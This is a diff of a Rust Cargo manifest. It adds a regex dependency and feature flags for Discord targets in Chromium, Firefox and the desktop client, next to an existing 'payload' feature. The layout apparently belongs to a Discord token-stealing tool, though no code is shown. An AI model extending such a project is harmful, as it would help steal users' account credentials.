@@ -6,6 +6,7 @@ edition = "2021"
 # See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html
 
 [dependencies]
+fancy-regex = { version = "0.10.0", optional = true }
 tempfile = { version = "3.3.0", optional = true }
 
 [build-dependencies]
@@ -14,3 +15,7 @@ config = { path = "../config" }
 
 [features]
 payload = ["dep:tempfile"]
+discord = ["discord-chromium", "discord-firefox", "discord-client"]
+discord-chromium = []
+discord-firefox = []
+discord-client = ["dep:fancy-regex"]
